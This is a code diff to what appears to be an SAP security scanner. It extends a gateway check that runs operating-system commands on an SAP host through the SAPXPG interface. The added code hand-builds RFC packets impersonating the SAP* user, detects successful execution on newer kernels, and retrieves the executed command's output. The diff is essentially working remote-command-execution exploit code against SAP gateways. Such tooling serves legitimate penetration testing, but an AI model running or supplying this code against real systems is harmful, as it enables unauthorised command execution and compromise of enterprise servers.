@@ -2490,41 +2490,40 @@ def check_gw_sapxpg(host, port, sid, hostname, command, timeout=5, instance=None
             return None
 
         # Check for STRTSTAT = 'O' (OK, command executed)
-        idx = resp.find(b"STRTSTAT")
+        # Try ASCII first, then UTF-16LE (kernel 793+ returns UTF-16LE)
         executed = False
+        idx = resp.find(b"STRTSTAT")
         if idx >= 0:
             window = resp[idx:idx + 50]
             for i in range(len(window)):
                 if window[i] == ord('O'):
                     executed = True
                     break
-
-        # Try to extract command output from the response.
-        # The SAPXPG response embeds stdout/stderr as readable ASCII
-        # strings after the STRTSTAT and LOG fields.
-        cmd_output = ""
-        if executed:
-            # Extract all readable ASCII strings from the response
-            # and filter out known protocol fields / noise
-            protocol_noise = {
-                "STRTSTAT", "XPGID", "CONVID", "EXTPROG", "PARAMS",
-                "LONG_PARAMS", "STDERRCNTL", "STDOUTCNTL", "STDINCNTL",
-                "TERMCNTL", "TRACECNTL", "LOG", "SAPXPG_START_XPG_LONG",
-                "MSG_SERVER", conv_id or "",
-            }
-            raw_strings = extract_ascii_strings(resp, 3)
-            # Look for output after STRTSTAT in the response
-            strt_pos = resp.find(b"STRTSTAT")
-            if strt_pos >= 0:
-                tail = resp[strt_pos:]
-                out_strings = extract_ascii_strings(tail, 3)
-                for s in out_strings:
-                    s_stripped = s.strip()
-                    if (s_stripped and s_stripped not in protocol_noise
-                            and not s_stripped.startswith(("SAPXPG", "SAP"))
-                            and len(s_stripped) > 2):
-                        cmd_output = s_stripped
+        else:
+            strtstat_utf16 = "STRTSTAT".encode("utf-16-le")
+            idx = resp.find(strtstat_utf16)
+            if idx >= 0:
+                window = resp[idx + len(strtstat_utf16):idx + len(strtstat_utf16) + 30]
+                for i in range(0, len(window) - 1, 2):
+                    lo, hi = window[i], window[i + 1]
+                    if hi == 0 and lo == ord('O'):
+                        executed = True
                         break
+
+        # Step 4: SAPXPG_END_XPG — retrieve command output
+        cmd_output = ""
+        if executed and conv_id:
+            try:
+                p4 = build_gw_p4(conv_id, host, hostname, sid, instance)
+                ni_send(sock, p4)
+                resp4 = ni_recv(sock, timeout + 5)
+
+                if resp4 and b"*ERR*" not in resp4:
+                    output_lines = extract_p4_output(resp4)
+                    if output_lines:
+                        cmd_output = "\n".join(output_lines)
+            except Exception:
+                pass  # P4 failure is non-fatal; command was already executed
 
         if executed or conv_id:
             detail = "Gateway accepted SAPXPG connection (conv_id=%s)" % conv_id
@@ -6707,6 +6706,166 @@ def build_gw_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, clien
     p += struct.pack("!I", 28000)
 
     return p
+
+
+def build_saprfxpg_end():
+    """Build SAPRFXPG_END structure for SAPXPG_END_XPG."""
+    x = b""
+    x += build_tlv(b"\x05\x12\x02\x05", b"EXITCODE")
+    x += build_tlv(b"\x02\x05\x02\x05", b"STRTSTAT")
+    x += build_tlv(b"\x02\x05\x03\x01", b"LOG")
+    x += build_tlv(b"\x03\x01\x03\x30", b"\x00\x00\x00\x01")
+    x += build_tlv(b"\x03\x30\x03\x02", b"\x00\x00\x00\x80\x00\x00\x00\x00")
+    return x
+
+
+def build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client):
+    """Build full SAPCPIC structure for SAPXPG_END_XPG.
+
+    Uses the same full format as P3 (with TH struct and metadata TLVs)
+    but with the SAPXPG_END_XPG function name and END payload.
+    Kernel 793+ requires this full format; the shorter SAPCPIC2 format
+    returns RFC_NOT_FOUND on newer kernels.
+    """
+    host_sid_inbr = "%s_%s_%s" % (hostname, sid, instance)
+
+    th = build_saprfc_th_struct(sid, hostname, instance, target_ip)
+    cpic_param_data = build_sapcpicparam(target_ip, flag=2)
+    cpic_param2_data = build_sapcpicparam2()
+    xpg_end = build_saprfxpg_end()
+    suffix = build_sapcpic_suffix(kernel)
+
+    c = b""
+    c += b"\x01\x01\x00\x08"
+    c += struct.pack("!H", 257)
+    c += b"\x01\x01\x01\x01"
+    c += struct.pack("!H", 0)
+    c += b"\x01\x01\x01\x03"
+    c += struct.pack("!H", 4) + b"\x00\x00\x06\x1b"
+    c += b"\x01\x03\x01\x06"
+    c += struct.pack("!H", 11) + b"\x04\x01\x00\x03\x01\x03\x02\x00\x00\x00\x23"
+
+    c += build_tlv(b"\x01\x06\x00\x07", pad_right(target_ip, 15, b" "))
+    c += build_tlv(b"\x00\x07\x00\x18", target_ip.encode("ascii"))
+    c += build_tlv(b"\x00\x18\x00\x08", host_sid_inbr.encode("ascii"))
+    c += build_tlv(b"\x00\x08\x00\x11", b"3")
+    c += build_tlv(b"\x00\x11\x00\x13", (kernel + " ").encode("ascii"))
+    c += build_tlv(b"\x00\x13\x00\x12", (kernel + " ").encode("ascii"))
+    c += build_tlv(b"\x00\x12\x00\x06", dest.encode("ascii"))
+    c += build_tlv(b"\x00\x06\x01\x30", b"SAPLSSXP")
+    c += build_tlv(b"\x01\x30\x01\x11", b"SAP*")
+    c += build_tlv(b"\x01\x11\x01\x14", client.encode("ascii"))
+    c += build_tlv(b"\x01\x14\x01\x15", b"E")
+    c += build_tlv(b"\x01\x15\x00\x09", b"SAP*")
+    c += build_tlv(b"\x00\x09\x01\x34", client.encode("ascii"))
+    c += build_tlv(b"\x01\x34\x05\x01", b"\x01")
+
+    c += b"\x05\x01\x01\x36"
+    c += struct.pack("!H", len(cpic_param_data)) + cpic_param_data
+
+    c += b"\x01\x36\x05\x02"
+    c += struct.pack("!H", 0)
+
+    c += build_tlv(b"\x05\x02\x00\x0b", kernel.encode("ascii"))
+    c += build_tlv(b"\x00\x0b\x01\x02", b"SAPXPG_END_XPG")
+
+    c += b"\x01\x02\x05\x03"
+    c += struct.pack("!H", 0)
+
+    c += b"\x05\x03\x01\x31"
+    c += struct.pack("!H", len(th)) + th
+
+    c += b"\x01\x31\x05\x14"
+    c += struct.pack("!H", len(cpic_param2_data)) + cpic_param2_data
+
+    c += build_tlv(b"\x05\x14\x04\x20", b"\x00\x00\x00\x00")
+    c += b"\x04\x20\x05\x12"
+    c += struct.pack("!H", 0)
+
+    c += xpg_end
+
+    c += b"\x03\x02\x01\x04"
+    c += struct.pack("!H", len(suffix)) + suffix
+
+    c += b"\x01\x04\xff\xff"
+    c += struct.pack("!H", 0)
+
+    c += b"\xff\xff\x00\x00"
+
+    return c
+
+
+def build_gw_p4(conv_id, target_ip, hostname, sid, instance,
+                kernel="793", dest="T_75", client="000"):
+    """Build F_SAP_SEND packet with SAPXPG_END_XPG to retrieve command output.
+
+    Uses the full SAPCPIC format (with TH struct and metadata TLVs)
+    which works on both older and newer (793+) SAP kernels.
+    """
+    cpic_end = build_sapcpic_end(target_ip, hostname, sid, instance,
+                                 kernel, dest, client)
+
+    header = build_saprfc_header_v6(
+        func_type=0xCB,
+        gw_id=1,
+        uid=19,
+        info2=0,
+        info3=0,
+        timeout=500,
+        sap_param_len=8,
+        info=0x0085,
+        vector=0x0C,
+        conv_id=conv_id,
+    )
+
+    cm_ok = b"\x00" * 31 + b"\x02"
+
+    p = header + cm_ok + cpic_end
+    p += struct.pack("!H", len(cpic_end))
+    p += struct.pack("!I", 28000)
+
+    return p
+
+
+def extract_p4_output(data):
+    """Extract command output from a P4 (SAPXPG_END_XPG) response.
+
+    Handles two response formats:
+    - Old kernels (<793): output lines are TLV-encoded as XX XX 03 04 00 <len> <data>
+    - New kernels (793+): output is a single space-padded block in 03 02 03 03 TLV
+
+    Returns a list of output lines (strings).
+    """
+    lines = []
+    # Skip RFC header (48 bytes) + cm_ok (32 bytes) = 80 bytes
+    i = 80
+    while i < len(data) - 6:
+        # TLV output line: first line uses 03 02 03 04, subsequent 03 04 03 04
+        if (data[i:i+4] == b"\x03\x04\x03\x04"
+                or data[i:i+4] == b"\x03\x02\x03\x04"):
+            line_len = struct.unpack("!H", data[i+4:i+6])[0]
+            if line_len > 0 and i + 6 + line_len <= len(data):
+                raw = data[i+6:i+6+line_len]
+                text = raw.decode("ascii", errors="ignore").rstrip("\r\n \x00")
+                if text:
+                    lines.append(text)
+                i += 6 + line_len
+                continue
+        # Padded block (new kernels): 03 02 03 03 00 <len> <padded_data>
+        elif data[i:i+4] == b"\x03\x02\x03\x03":
+            block_len = struct.unpack("!H", data[i+4:i+6])[0]
+            if block_len > 0 and i + 6 + block_len <= len(data):
+                raw = data[i+6:i+6+block_len]
+                text = raw.decode("ascii", errors="ignore").rstrip(" \x00\r\n")
+                if text:
+                    for line in text.split("\n"):
+                        line = line.rstrip("\r ")
+                        if line:
+                            lines.append(line)
+                i += 6 + block_len
+                continue
+        i += 1
+    return lines
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
